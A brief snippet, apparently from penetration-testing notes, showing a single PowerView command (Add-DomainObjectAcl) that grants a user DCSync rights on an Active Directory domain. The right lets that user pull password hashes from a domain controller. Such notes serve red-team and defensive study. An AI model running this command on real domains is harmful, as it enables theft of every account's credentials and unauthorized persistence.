> Using PowerView we can grant the user the ability to perform a DC Sync attack:

```
Add-DomainObjectAcl -TargetIdentity "DC=<domainame>,DC=com" -PrincipalIdentity <user> -Rights DCSync -Domain '<domain>'
```
